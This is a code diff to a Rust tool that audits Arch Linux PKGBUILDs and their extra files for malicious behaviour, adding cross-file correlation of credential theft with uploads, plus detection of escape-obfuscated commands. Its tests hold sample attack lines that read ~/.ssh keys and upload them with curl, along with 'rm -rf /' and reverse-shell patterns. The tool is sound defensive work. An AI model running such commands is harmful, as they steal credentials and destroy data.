@@ -138,9 +138,12 @@ pub fn audit(
     scriptlet: Option<(&str, &str)>,
     extras: &[ExtraFile],
 ) -> AuditReport {
-    let mut findings = audit_file("PKGBUILD", pkgbuild, Mode::Pkgbuild);
+    let (mut findings, facts) = audit_file_facts("PKGBUILD", pkgbuild, Mode::Pkgbuild);
+    let mut all_facts: Vec<(String, Facts)> = vec![("PKGBUILD".to_string(), facts)];
     if let Some((name, text)) = scriptlet {
-        findings.extend(audit_file(name, text, Mode::Scriptlet));
+        let (f, facts) = audit_file_facts(name, text, Mode::Scriptlet);
+        findings.extend(f);
+        all_facts.push((name.to_string(), facts));
     }
     let scriptlet_name = scriptlet.map(|(n, _)| n);
     for extra in extras
@@ -148,12 +151,45 @@ pub fn audit(
         .filter(|e| e.path != "PKGBUILD" && Some(e.path.as_str()) != scriptlet_name)
         .take(MAX_EXTRA_FILES)
     {
-        findings.extend(audit_extra(extra));
+        let (f, facts) = audit_extra(extra);
+        findings.extend(f);
+        all_facts.push((extra.path.clone(), facts));
     }
+    correlate_across_files(&all_facts, &mut findings);
     sort_findings(&mut findings);
     AuditReport {
         target: target.to_string(),
         findings,
+    }
+}
+
+/// An upload in one file and a credential read in another is the same
+/// exfiltration as both in one: rate it critical. (Within a single file the
+/// scan already does this.)
+fn correlate_across_files(all: &[(String, Facts)], findings: &mut Vec<Finding>) {
+    for (upload_file, facts) in all {
+        if facts.uploads.is_empty() {
+            continue;
+        }
+        let Some((secret_file, line)) = all
+            .iter()
+            .filter(|(f, _)| f != upload_file)
+            .find_map(|(f, x)| x.secrets.first().map(|l| (f, *l)))
+        else {
+            continue;
+        };
+        for (no, text) in &facts.uploads {
+            findings.push(Finding {
+                rule: "exfiltration",
+                severity: Severity::Critical,
+                file: upload_file.clone(),
+                line: *no,
+                message: format!(
+                    "sends data over the network, and {secret_file}:{line} reads credentials"
+                ),
+                excerpt: excerpt(text),
+            });
+        }
     }
 }
 
@@ -241,20 +277,24 @@ const SCRIPT_EXTENSIONS: &[&str] = &[
 
 /// Reads one non-PKGBUILD file of the repo. Findings are labelled with its
 /// path.
-fn audit_extra(extra: &ExtraFile) -> Vec<Finding> {
+fn audit_extra(extra: &ExtraFile) -> (Vec<Finding>, Facts) {
     let path = extra.path.as_str();
     let base = path.rsplit('/').next().unwrap_or(path);
     let lower = base.to_lowercase();
     let ext = lower.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
+    // A finding about the file as a whole; no credential/upload facts.
     let note = |rule: &'static str, severity, msg: &str| {
-        vec![Finding {
-            rule,
-            severity,
-            file: path.to_string(),
-            line: 1,
-            message: msg.to_string(),
-            excerpt: path.to_string(),
-        }]
+        (
+            vec![Finding {
+                rule,
+                severity,
+                file: path.to_string(),
+                line: 1,
+                message: msg.to_string(),
+                excerpt: path.to_string(),
+            }],
+            Facts::default(),
+        )
     };
 
     if matches!(
@@ -265,7 +305,7 @@ fn audit_extra(extra: &ExtraFile) -> Vec<Finding> {
         || lower.starts_with("readme")
         || DATA_EXTENSIONS.contains(&ext)
     {
-        return Vec::new();
+        return (Vec::new(), Facts::default());
     }
     if extra.bytes.len() > MAX_EXTRA_BYTES {
         return note(
@@ -282,22 +322,19 @@ fn audit_extra(extra: &ExtraFile) -> Vec<Finding> {
         );
     }
     if extra.bytes.iter().take(8000).any(|b| *b == 0) {
-        return if matches!(
+        let archive = matches!(
             ext,
             "gz" | "xz" | "zst" | "bz2" | "zip" | "tar" | "tgz" | "7z"
-        ) {
-            note(
-                "opaque-file",
-                Severity::Warning,
-                "is an archive committed to the repo, which can't be inspected here",
-            )
-        } else {
-            note(
-                "opaque-file",
-                Severity::Warning,
-                "is a binary file that can't be inspected here",
-            )
-        };
+        );
+        return note(
+            "opaque-file",
+            Severity::Warning,
+            if archive {
+                "is an archive committed to the repo, which can't be inspected here"
+            } else {
+                "is a binary file that can't be inspected here"
+            },
+        );
     }
 
     let text = String::from_utf8_lossy(&extra.bytes);
@@ -312,7 +349,7 @@ fn audit_extra(extra: &ExtraFile) -> Vec<Finding> {
             })
             .collect::<Vec<_>>()
             .join("\n");
-        return audit_file(path, &added, Mode::Script)
+        let findings = audit_file(path, &added, Mode::Script)
             .into_iter()
             .map(|mut f| {
                 f.severity = f.severity.min(Severity::Warning);
@@ -320,11 +357,12 @@ fn audit_extra(extra: &ExtraFile) -> Vec<Finding> {
                 f
             })
             .collect();
+        return (findings, Facts::default());
     }
     if text.starts_with("#!") || SCRIPT_EXTENSIONS.contains(&ext) {
-        return audit_file(path, &text, Mode::Script);
+        return audit_file_facts(path, &text, Mode::Script);
     }
-    Vec::new()
+    (Vec::new(), Facts::default())
 }
 
 // ---------------------------------------------------------------- reader
@@ -685,6 +723,14 @@ fn parse(text: &str) -> Parsed {
             };
             let mut items = tokenize(inner);
             if !is_array {
+                // `VAR=value command args…` runs `command` with VAR set; it is
+                // a command, not just an assignment.
+                if items.len() > 1 {
+                    parsed.toplevel.push(Line {
+                        no,
+                        text: format!("{name}={}", acc.replace('\n', " ")),
+                    });
+                }
                 items.truncate(1);
             }
             if dynamic {
@@ -919,6 +965,30 @@ fn stage_of(text: &str, piped: bool) -> Stage {
         piped,
         text: text.to_string(),
     }
+}
+
+/// Is the first word an ANSI-C string of several hex/octal escapes
+/// (`$'\x63\x75\x72\x6c'`), i.e. a command name spelled out to hide it? A
+/// lone colour code like `$'\033[1m'` is not.
+fn spelled_with_escapes(stage_text: &str) -> bool {
+    let Some(rest) = stage_text.strip_prefix("$'") else {
+        return false;
+    };
+    let Some(end) = rest.find('\'') else {
+        return false;
+    };
+    let word = &rest[..end];
+    let escapes = word.matches("\\x").count()
+        + word
+            .match_indices('\\')
+            .filter(|(i, _)| {
+                word[i + 1..]
+                    .chars()
+                    .next()
+                    .is_some_and(|c| ('0'..='3').contains(&c))
+            })
+            .count();
+    escapes >= 3 && !word.contains(' ')
 }
 
 /// Variables that are conventionally tools, so `$CC -o x y.c` is ordinary.
@@ -1406,7 +1476,7 @@ impl Scan<'_> {
         // Code that hides what it runs.
         if stages
             .iter()
-            .any(|s| s.text.trim_start().starts_with("$'\\"))
+            .any(|s| spelled_with_escapes(s.text.trim_start()))
         {
             self.add(
                 "obfuscated-command",
@@ -1873,7 +1943,20 @@ const TOPLEVEL_OK: &[&str] = &[
     ";;", "cd",
 ];
 
+/// What a file reads and sends, kept so it can be correlated with other files.
+#[derive(Debug, Default, Clone)]
+struct Facts {
+    /// Lines that touch credentials.
+    secrets: Vec<usize>,
+    /// Lines that send data over the network, with their text.
+    uploads: Vec<(usize, String)>,
+}
+
 fn audit_file(file: &str, text: &str, mode: Mode) -> Vec<Finding> {
+    audit_file_facts(file, text, mode).0
+}
+
+fn audit_file_facts(file: &str, text: &str, mode: Mode) -> (Vec<Finding>, Facts) {
     let scriptlet = mode == Mode::Scriptlet;
     let parsed = parse(text);
     let mut scan = Scan {
@@ -1937,8 +2020,12 @@ fn audit_file(file: &str, text: &str, mode: Mode) -> Vec<Finding> {
     scan.shell_wiring = ["dup2", "pty.spawn", "/bin/sh -i", "/bin/bash -i"]
         .iter()
         .any(|p| text.contains(p));
+    let facts = Facts {
+        secrets: scan.secret_lines.clone(),
+        uploads: scan.upload_lines.clone(),
+    };
     scan.finish();
-    scan.findings
+    (scan.findings, facts)
 }
 
 fn is_vcs(source: &str) -> bool {
@@ -2721,8 +2808,13 @@ EOF
             "obfuscated-command",
             Severity::High
         ));
-        // Ordinary ANSI-C strings as arguments are fine.
-        for ok in ["IFS=$'\\n'", "echo -e $'\\033[0m' done"] {
+        // Ordinary ANSI-C strings as arguments, and lone colour codes, are fine.
+        for ok in [
+            "IFS=$'\\n'",
+            "echo -e $'\\033[0m' done",
+            "$'\\033[1m'bold",
+            "$'\\e]0;title\\a'",
+        ] {
             assert!(
                 !has(&body("build", ok), "obfuscated-command", Severity::High),
                 "{ok}"
@@ -3058,6 +3150,82 @@ EOF
             "privilege",
             Severity::High
         ));
+    }
+
+    #[test]
+    fn credentials_read_in_one_file_and_sent_from_another_are_correlated() {
+        let read = extra("collect.sh", "#!/bin/sh\ntar c ~/.ssh > /tmp/k\n");
+        let send = extra("send.sh", "#!/bin/sh\ncurl -T /tmp/k http://e.org/up\n");
+        // Neither file alone is critical.
+        assert!(!extra_has(
+            std::slice::from_ref(&read),
+            "collect.sh",
+            "exfiltration",
+            Severity::Critical
+        ));
+        assert!(!extra_has(
+            std::slice::from_ref(&send),
+            "send.sh",
+            "exfiltration",
+            Severity::Critical
+        ));
+        // Together, the sender is.
+        let both = [read, send];
+        assert!(
+            extra_has(&both, "send.sh", "exfiltration", Severity::Critical),
+            "{:?}",
+            extras_report(&both)
+        );
+        let hit = audit("t", "pkgname=x\n", None, &both)
+            .findings
+            .into_iter()
+            .find(|f| f.rule == "exfiltration")
+            .unwrap();
+        assert!(hit.message.contains("collect.sh:2"), "{}", hit.message);
+
+        // The PKGBUILD counts as a file too.
+        let pkg = "pkgname=x\nbuild() {\n  cat ~/.ssh/id_rsa > /tmp/k\n}\n";
+        let report = audit(
+            "t",
+            pkg,
+            None,
+            &[extra(
+                "send.sh",
+                "#!/bin/sh\ncurl -F f=@/tmp/k http://e.org\n",
+            )],
+        );
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.rule == "exfiltration" && f.file == "send.sh"));
+
+        // An upload with no credential read anywhere stays quiet.
+        let lone = [extra("send.sh", "#!/bin/sh\ncurl -F f=@x http://e.org\n")];
+        assert!(!extra_has(
+            &lone,
+            "send.sh",
+            "exfiltration",
+            Severity::Critical
+        ));
+    }
+
+    #[test]
+    fn env_prefixed_commands_are_commands() {
+        // `VAR=value cmd` at the top level of a script or PKGBUILD.
+        let script = [extra("run.sh", "#!/bin/sh\nLD_PRELOAD=./x.so make\n")];
+        assert!(extra_has(&script, "run.sh", "ld-preload", Severity::High));
+        let sudo = [extra("run.sh", "#!/bin/sh\nHOME=/root sudo make install\n")];
+        // Script mode drops PKGBUILD-only rules, but the command is now read:
+        assert!(!extra_has(&sudo, "run.sh", "privilege", Severity::High));
+        let rm = [extra("run.sh", "#!/bin/sh\nFOO=1 rm -rf /\n")];
+        assert!(extra_has(&rm, "run.sh", "destructive", Severity::Critical));
+        // A plain assignment is still just an assignment.
+        let plain = [extra("run.sh", "#!/bin/sh\nFOO=bar\nBAZ=\"a b c\"\n")];
+        assert!(
+            extras_report(&plain).is_empty(),
+            "{:?}",
+            extras_report(&plain)
+        );
     }
 
     #[test]
